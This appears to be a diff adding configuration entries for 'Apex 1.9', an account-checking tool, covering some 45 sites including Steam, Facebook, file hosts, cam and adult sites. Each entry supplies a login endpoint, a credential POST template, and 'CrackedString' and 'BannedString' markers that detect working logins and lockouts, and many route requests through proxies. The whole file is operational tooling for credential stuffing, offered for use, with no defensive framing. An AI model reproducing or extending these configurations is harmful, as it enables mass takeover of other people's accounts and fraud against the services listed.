@@ -1,0 +1,667 @@
+The following Apex 1.9 Configurations are listed in order here....add these to your config.ini file at the bottom to load
+them into Apex.
+
+Rapidshare File
+Deposit Files
+uploaded.to
+HotFile
+Easy-Share
+Megaupload
+Megaupload Platinum
+Netload
+zShare.net
+Badongo
+Steam
+Cam4
+SendSpace
+ImLive
+FileFactory
+MediaFire
+Facebook
+storage.to
+Islandor
+Tube8
+Koostube
+BrazzersReel
+Pornhub
+MegaPorn
+FileList
+FreakShare
+KeezPremium
+RedtubePremium
+RealityKings
+Naked.com
+Brazzers
+Webcams
+Flirt4Free VIP
+Flirt4Free
+NeonCams
+FileDropper
+Divx Den
+AppScene
+DirectGameKeys
+Photobucket
+FileServe
+HD Porn Pass
+Demonoid
+DivShare
+Juciys World
+Oron
+
+
+
+
+[RSF]
+Name=Rapidshare File
+Host=rs311.rapidshare.com
+UseProxies=True
+UsePost=True
+PostPage=/cgi-bin/premium.cgi
+CrackedString=The Account is valid
+BannedString=
+InvalidString=Error
+UseEmails=False
+PostString=premiumlogin=1&fileid=295261324&filenam e=x.rar&serverid=311&
+accountid=[user]&password=[pass] 
+
+[RS-API]
+Name=RapidShare API
+Host=api.rapidshare.com
+UseProxies=True
+UsePost=False
+GetPage=/cgi-bin/rsapi.cgi?sub=getaccountdetails_v1&type=prem&login =[user]&password=[pass]
+CrackedString=rsantihack
+BannedString=IP blocked
+InvalidString=ERROR: Lo||1-Click web hosting
+UseEmails=False 
+
+[DF]
+Name= Deposit Files
+UseProxies=False
+Host=depositfiles.com
+UsePost=True
+PostString=go=1&login=[user]&password=[pass]
+PostPage=/en/login.php?return=%2Fen%2F
+CrackedString=Set-Cookie: autologin=
+InvalidString=Server: nginx
+BannedString=
+UseEmails=False 
+
+[UT]
+Name=uploaded.to
+UseProxies=False
+Host=uploaded.to
+UsePost=True
+PostString=email=[user]&password=[pass]
+PostPage=/login
+Crackedstring=Set-Cookie: auth=
+InvalidString=
+Referer=http://uploaded.to/login
+UseEmails=False 
+
+[HF]
+Name=hotfile.com
+UseProxies=True
+Host=hotfile.com
+UsePost=True
+PostString=returnto=returnto=%2F&user=[user]&pass=[pass]
+PostPage=/login.php
+CrackedString=Set-Cookie: auth=
+InvalidString=Bad username/password combination
+BannedString=Too many failed attempts to login
+UseEmails=False 
+
+[ES]
+Name=Easy-Share.com
+UseProxies=True
+Host=www.easy-share.com
+UsePost=True
+PostString=login=[user]&password=[pass]&remember=1
+PostPage=/accounts/login
+CrackedString=Set-Cookie: properitesp=
+InvalidString=Content-Length: 1
+BannedString=
+UseEmails=False 
+
+
+[MU]
+Name=Megaupload
+UseProxies=True
+Host=www.megaupload.com
+UsePost=True
+PostPage=/?c=login
+PostString=login=1&redir=1&username=[user]&password=[pass]
+CrackedString=Set-Cookie: user=
+InvalidString= MEGAUPLOAD - The
+BannedString=
+UseEmails=False
+
+
+[NL]
+Name=Netload
+UseProxies=FALSE
+Host=netload.in
+UsePost=TRUE
+PostString=txtuser=[user]&txtpass=[pass]&txtcheck=login&txtlogin=
+PostPage=/index.php
+CrackedString=Set-Cookie: cookie_user=
+InvalidString=Location: /index.php?id=15
+GetPage=
+
+
+[zS]
+Name=zShare.net
+UseProxies=FALSE
+Host=zshare.net
+UsePost=TRUE
+PostString=username=[user]&password=[pass]&submit=Login
+PostPage=/myzshare/process.php?loc=http://zshare.net/myzshare/login.php
+CrackedString=fsafsafasfas
+InvalidString=login.php?msg=
+GetPage=
+
+
+
+[BAD]
+Name=Badongo.com
+UseProxies=FALSE
+Host=www.badongo.com
+UsePost=TRUE
+PostString=username=[user]&password=[pass]&cap_id=&cap_secret=c17f254bcdb8091e041362993894ba 20&bk=&do=login&cou=en&no_ssl=1
+PostPage=/login
+CrackedString=Set-Cookie: badongoU=
+InvalidString=Set-Cookie: badongoL=en;
+GetPage=
+
+
+[Ste]
+Name=Steam.com
+Host=store.steampowered.com
+UseProxies=True
+UsePost=True
+PostPage=/login/
+PostString=redir=&username=[user]&password=[pass]
+CrackedString=Set-Cookie: steamLogin=
+BannedString=
+InvalidString=Location: https://store
+UseEmails=False
+
+
+[C4]
+Name=Cam4
+UseProxies=FALSE
+Host=cam4.com
+UsePost=TRUE
+PostString=username=[user]&password=[pass]&submit=login
+PostPage=/login/
+CrackedString=HTTP/1.1 302
+InvalidString=Server: Apache-Coyote/1.1
+GetPage=
+
+
+[SS]
+Name=SendSpace
+UseProxies=FALSE
+Host=sendspace.com
+UsePost=TRUE
+PostString=action=login&username=[user]&password=[pass]&remember=1&submit=login&openid_url=&action_type=l ogin
+PostPage=/login.html
+CrackedString=HTTP/1.1 302
+InvalidString=HTTP/1.1 200
+GetPage=
+Cookie=SID=9caada16d1132fa1c4f51b29011cab19; ssui=d5e1bbae3d55e60b955e623d7bf27afb
+
+
+[IL]
+Name=ImLive
+UseProxies=False
+Host=imlive.com
+UsePost=True
+PostString=txtUsername=[user]&txtPassword=[pass]&func=log&Submit1=GO
+PostPage=/members.aspx
+CrackedString=HTTP/1.1 200
+InvalidString=?errorid=
+Cookie=ASP.NET_SessionId=zteb2o455i42ip551qfacqvs; imlv=d1L8nYGrPxxKfmvRaNCT6s6MpjdKe%2bsvHgUcdJmSzWU BnG0bLGCR8Ru4M1XV9pVGZQrsPdJNJ9vMSxzItrTNrXolU9EVm QLB4YN904OKnr0%3d
+BannedString=
+UseEmails=False
+
+
+[FF]
+Name=FileFactory
+UseProxies=False
+Host=filefactory.com
+UsePost=TRUE
+PostString=email=[user]&password=[pass]&redirect=%2F%3Flogout%3D1%26
+PostPage=/member/login.php?
+Crackedstring=Set-Cookie: ff_membership=
+InvalidString=Location: /member/login.php?err=1
+UseEmails=TRUE
+
+
+[MF]
+Name=MediaFire
+Host=www.mediafire.com
+UseProxies=False
+UsePost=True
+PostPage=/dynamic/login.php
+PostString=login_email=[user]&login_pass=[pass]&submit
+CrackedString=Set-Cookie: user=
+BannedString=
+InvalidString=Set-Cookie: ukey=
+Cookie=ukey=t7f9uqyqmpqw453crbjk1vpl5q8z4k9d; __utma=213136648.23486629.1295008387.1295008387.1295008387.1; __utmb=213136648.14.10.1295008387; __utmc=213136648; __utmz=213136648.1295008387.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=MediaFire; __utmv=; user=x; skey=l1abx2zmjgz
+UseEmails=False
+
+
+[FB]
+Name=Facebook
+UseProxies=False
+Host=m.facebook.com
+UsePost=TRUE
+PostPage=/login.php
+PostString=email=[user]&pass=[pass]&login=Log+In
+CrackedString=Location: /home.php?m||Content-Length: 3
+InvalidString=SWEETHOLYJESUS||reg_fb_ref=
+Cookie=datr=1261362629-795d86746b30064a7128dfba97e0e803fee539d67dac8bcd73 7d4
+ParseCookie=datr
+
+
+[ST]
+Name=storage.to
+Host=storage.to
+UseProxies=False
+UsePost=True
+PostPage=/login
+PostString=email=[user]&password=[pass]&=Login
+CrackedString=Login successful
+BannedString=
+InvalidString=Password
+UseEmails=True
+
+
+[IS]
+Name=Islandor
+UseProxies=False
+Host=islandor.com
+UsePost=True
+UseProxies=False
+PostPage=/?a=login
+PostString=email=[user]&password=[pass]&world=en1&submit=Login
+CrackedString=en1.islandor.com
+InvalidString=<div id="error">Invalid email address or password!</div>
+BannedString=
+UseEmails=True
+
+
+[T8]
+Name=Tube8
+UseProxies=False
+Host=www.tube8.com
+UsePost=True
+UseProxies=False
+PostPage=/login.html
+PostString=username=[user]&password=[pass]&submit=Login
+CrackedString=Set-Cookie: ual=
+InvalidString=/login.html
+BannedString=
+UseEmails=False
+
+
+[KO]
+Name=Koostube
+UseProxies=False
+Host=www.koostube.com
+UsePost=True
+UseProxies=False
+PostPage=/login.php
+PostString=username=[user]&password=[pass]&action_login=Log+In
+CrackedString=premium.koostube.com
+InvalidString=/login.php
+BannedString=
+UseEmails=False
+HostIP=0.0.0.0
+
+
+[BR]
+Name=BrazzersReel
+UseProxies=True
+Host=www.brazzersreel.com
+UsePost=True
+UseProxies=True
+PostPage=/tour/?action=login
+PostString=username=[user]&password=[pass]&x=53&y=13&submit=Login
+CrackedString=/membersa/
+InvalidString=?action=unauth
+BannedString=
+UseEmails=False
+
+
+[PH]
+Name=Pornhub
+UseProxies=False
+Host=www.pornhub.com
+UsePost=True
+UseProxies=False
+PostPage=/login
+PostString=username=[user]&password=[pass]&remember_me=1&submit=LOG+IN
+CrackedString=http://www.pornhubpremium.com/touru/?action=login&info=
+InvalidString=200 OK
+BannedString=
+UseEmails=False
+
+
+[MP]
+Name=MegaPorn
+UseProxies=True
+Host=www.megaporn.com
+UsePost=True
+PostPage=/?c=login
+PostString=login=1&redir=1&username=[user]&password=[pass]
+CrackedString=Set-Cookie: user=
+InvalidString= MEGAPORN - The
+BannedString=
+UseEmails=False
+
+
+[FL]
+Name=FileList
+UseProxies=True
+Host=filelist.ro
+UsePost=True
+UseProxies=False
+PostPage=/takelogin.php
+PostString=username=[user]&password=[pass]&submit=Login!
+CrackedString=/my.php
+InvalidString=/takelogin.php
+BannedString=
+UseEmails=False
+
+
+[FS]
+Name=FreakShare
+UseProxies=False
+Host=freakshare.net
+UsePost=True
+UseProxies=False
+PostPage=/login.html
+PostString=user=[user]&pass=[pass]&submit=Login
+CrackedString=Set-Cookie: login=
+InvalidString=/login.html
+BannedString=
+UseEmails=False
+
+
+[KP]
+Name=KeezPremium
+UseProxies=True
+Host=www.keezpremium.com
+UsePost=True
+UseProxies=True
+PostPage=/tour/?action=login
+PostString=uname=[user]&pword=[pass]&referer=&submit=Login
+CrackedString=/membersa/
+InvalidString=?action=unauth
+BannedString=
+UseEmails=False
+
+
+[RT]
+Name=RedtubePremium
+UseProxies=True
+Host=premium.redtube.com
+UsePost=True
+UseProxies=True
+PostPage=/tour/?action=login
+PostString=uname=[user]&pword=[pass]&referer=&submit=Log+In
+CrackedString=/membersa/
+InvalidString=?action=unauth
+BannedString=
+UseEmails=False
+
+
+[RK]
+Name=RealityKings
+UseProxies=True
+Host=m.rk.com
+UsePost=True
+UseProxies=True
+PostPage=/?&act=login
+PostString=username=[user]&password=[pass]&submit=Login
+CrackedString=/?act=members
+InvalidString=/?&act=login
+BannedString=Too many failed login attempts, please try back later
+UseEmails=False
+
+
+[N]
+Name=Naked.com
+Host=naked.com
+UseProxies=True
+UsePost=True
+PostPage=/index.php?s=user.register.login&
+PostString=SearchText=Models&suggestSearch=search& freeRegister=&mname=&username=[user]&pass=[pass]&keyCap=&ioBB=0400ECMrL0Y0dRQ%2FyoVIBnjaiulAQ1gpXg zLjKFhkqmpJODQtVCYANQUGUOCbnRzpX9SgGJyBpj55vPIB9Qx nksoWuw1wrTYexgJqZobk9CPd5cAYwauIzYdlRzmWIC3Gmty68 tL0WXB8EfYItQoDSMwA2qxCFeKYjKq9%2B%2BvklRVNjSVT31S gfbGSVeEobLCdIboiGWkaqTGYKPptDDJtU%2BBazNVQqTWz5yw %2Bd2QupT6%2FUfCvbCcPMhnp1%2BrdsbATajAmPqQlLCqqHYb CuN61FXtiyMnF
+CrackedString=/index.php?s=index&target=1
+BannedString=
+InvalidString=/index.php?s=user.register.login&
+UseEmails=False
+
+
+[BB]
+Name=Brazzers
+UseProxies=True
+Host=www.brazzersmobile.com
+UsePost=True
+UseProxies=True
+PostPage=/t6/login/
+PostString=username=[user]&password=[pass]&submit=Login
+CrackedString=/m1/
+InvalidString=/t6/404
+BannedString=
+UseEmails=False
+
+
+[W]
+Name=Webcams
+Host=www.webcams.com
+UseProxies=False
+UsePost=True
+PostPage=/index.php?action=Login
+PostString=check_cancelled=1&username=[user]&password=[pass]
+CrackedString=Set-Cookie: wc_skip_warning=2
+BannedString=
+InvalidString=200 OK
+UseEmails=False
+
+
+[F4F]
+Name=Flirt4Free
+Host=www.flirt4free.com
+UseProxies=True
+UsePost=True
+PostPage=/my-account/?a=login
+PostString=small=&acctCheck=1&send_to_page=%252525 2Findex.php&login%5Busername%5D=[user]&login%5Bpassword%5D=[pass]&submit==Login+to+Your+Account
+CrackedString=Set-Cookie: has_logged_in=1
+BannedString=
+InvalidString=/?a=login
+UseEmails=False
+
+
+[F4FVIP]
+Name=Flirt4Free VIP
+Host=www.flirt4free.com
+UseProxies=True
+UsePost=True
+PostPage=/my-account/?a=login
+PostString=small=&acctCheck=1&send_to_page=%252525 2Findex.php&login%5Busername%5D=[user]&login%5Bpassword%5D=[pass]&submit==Login+to+Your+Account
+CrackedString=Set-Cookie: source_code=vod_system
+BannedString=
+InvalidString=/?a=login
+UseEmails=False
+
+
+[Neon]
+Name=NeonCams
+Host=member.neoncams.com
+UseProxies=False
+UsePost=True
+PostPage=/login
+PostString=fastlogin=yes&login=[user]&password=[pass]&loginsubmit=Login
+CrackedString=Set-Cookie: loginflag=true
+BannedString=
+InvalidString=/fastlogin/
+UseEmails=False
+
+
+[FD]
+Name=FileDropper
+Host=www.filedropper.com
+UseProxies=True
+UsePost=True
+PostPage=/login.php
+PostString=username=[user]&password=[pass]&submit=login
+CrackedString=Set-Cookie: uniqueid=
+BannedString=
+InvalidString=Invalid login credentials or account no longer valid!
+UseEmails=False
+
+
+[DD]
+Name= Divx Den
+Host=www.divxden.com
+UseProxies=False
+UsePost=True
+PostPage=/login.html
+PostString=op=login&redirect=&login=[user]&password=[pass]&x=18&y=7
+CrackedString=302 Moved
+BannedString=
+InvalidString=200 OK
+UseEmails=False
+
+
+[AS]
+Name=AppScene
+Host=www.appscene.org
+UseProxies=True
+UsePost=True
+PostPage=/premium_login
+PostString=user=[user]&pass=[pass]&submit=Login
+CrackedString=Set-Cookie:
+BannedString=
+InvalidString=/premium_login
+UseEmails=False
+
+
+[DGK]
+Name= DirectGameKeys
+Host=www.directgamekeys.com
+UseProxies=True
+UsePost=True
+PostPage=/login.php?action=check_login
+PostString=login_email=[user]&login_pass=[pass]
+CrackedString=302 Moved Temporarily
+BannedString=
+InvalidString=200 OK
+UseEmails=False
+
+
+[PB]
+Name=Photobucket
+Host=photobucket.com
+UseProxies=False
+UsePost=True
+PostPage=/login
+PostString=loginForm%5Bredir%5D=&loginForm%5Bredir ectAction%5D=&loginForm%5BredirectParams%5D=&login Form%5BreturnUrl%5D=&action=login&loginForm%5Buser nameemail%5D=[user]&loginForm%5Bpassword%5D=[pass]
+CrackedString=pbauth=
+BannedString=
+InvalidString=Location: /
+UseEmails=False
+
+
+
+
+[FileServe]
+Name=FileServe
+Host=www.fileserve.com
+UseProxies=True
+UsePost=True
+PostPage=/login.php
+PostString=loginUserName=[user]&loginUserPassword=[pass]&autoLogin=&loginFormSubmit=Login
+CrackedString=<table id="top_premium_mem">
+BannedString=
+InvalidString=<a href="/" id="logo
+
+
+[HDPorn]
+Name=HD Porn Pass
+Host=www.hdpornpass.com
+UseProxies=False
+UsePost=True
+PostPage=/login/
+PostString=username=[user]&password=[pass]&submit=Sign+In+%3E%3E
+CrackedString=302 Found
+BannedString=
+InvalidString=200 OK
+UseEmails=False
+
+
+[DM]
+Name= Demonoid
+Host=www.demonoid.com
+UseProxies=True
+UsePost=True
+PostPage=/account_handler.php
+PostString=nickname=[user]&password=[pass]&Submit=Submit&returnpath=%2F&withq=0
+CrackedString=Location: /account_handler.php
+BannedString=
+InvalidString=Set-Cookie: vc0=deleted
+UseEmails=False
+
+
+[DIV]
+Name= DivShare
+Host=divshare.com
+UseProxies=True
+UsePost=True
+PostPage=/login
+PostString=user_email=[user]&user_password=[pass]&login_submit=Log+in+%3E
+CrackedString=Set-Cookie: ds_session=
+BannedString=
+InvalidString=Connection: close
+UseEmails=True
+
+
+[JU]
+Name=Juciys World
+Host=juicysworld.com
+UseProxies=False
+UsePost=True
+PostPage=/login.php
+PostString=username=[user]&password=[pass]&action_login=+
+CrackedString=302 Found
+BannedString=
+InvalidString=200 OK
+UseEmails=False
+
+
+[oron]
+Name=Oron
+Host=oron.com
+UseProxies=True
+UsePost=True
+PostPage=/login.html
+PostString=login=[user]&password=[pass]&op=login&redirect=
+CrackedString=302 Moved
+BannedString=
+InvalidString=200 OK
+UseEmails=False
+
+[MU]
+Name=Megaupload Platinum
+UseProxies=True
+Host=www.megaupload.com
+UsePost=True
+PostPage=/?c=login
+PostString=login=1&redir=1&username=[user]&password=[pass]
+CrackedString=com/gui2/user_crown.gif
+InvalidString=HTTP/1.1 200 OK
+BannedString=
+UseEmails=False
